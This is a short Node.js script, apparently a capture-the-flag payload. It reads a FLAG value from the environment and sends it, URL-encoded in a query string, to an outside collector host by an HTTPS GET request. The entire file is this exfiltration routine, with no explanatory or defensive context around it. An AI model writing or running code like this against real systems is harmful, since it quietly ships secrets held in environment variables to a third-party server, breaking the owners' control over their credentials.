const https = require('https');
const flag = process.env.FLAG || process.env.flag || null;
if (flag) {
  const url = `https://collector.example.co/submit?flag=${encodeURIComponent(flag)}`;
  const urlObj = new URL(url);
  const req = https.request({
    hostname: urlObj.hostname,
    port: 443,
    path: urlObj.pathname + urlObj.search,
    method: 'GET'
  });
  req.end();
}
